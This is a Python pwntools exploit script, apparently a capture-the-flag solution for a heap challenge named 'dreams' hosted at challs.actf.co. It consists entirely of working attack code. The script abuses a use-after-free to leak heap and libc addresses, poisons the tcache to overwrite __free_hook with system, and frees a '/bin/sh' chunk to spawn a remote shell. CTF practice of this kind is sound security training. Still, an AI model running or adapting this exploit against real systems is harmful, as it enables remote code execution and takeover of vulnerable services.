from pwn import *

libc = ELF('./libc.so.6')
# p = process('./dreams')
p = remote('challs.actf.co', 31227)

def add(idx, date = b'a', content = b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'? ', str(idx).encode('ascii'))
    p.sendafter(b'? ', date)
    p.sendafter(b'? ', content)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'? ', str(idx).encode('ascii'))

def view(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'? ', str(idx).encode('ascii'))

add(0)
add(1)
free(1)
free(0)

view(0)

p.recvuntil(b'Hmm... I see. It looks like your dream is telling you that ')

heap_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x10
print(hex(heap_base))

p.recv()
p.send(p64(0x404000))

add(2)
add(3, b'a'*8, b'b'*16)

view(3)
p.recvuntil(b'b'*16)

libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x1ed6a0
print(hex(libc.address))

free_hook = libc.sym['__free_hook']
system = libc.sym['system']

p.recv()
p.send(p64(0))

free(1)
free(0)
view(0)

p.recv()
p.send(p64(free_hook - 8))

add(7)
add(8, b'/bin/sh\x00', p64(system))

free(8)

p.interactive()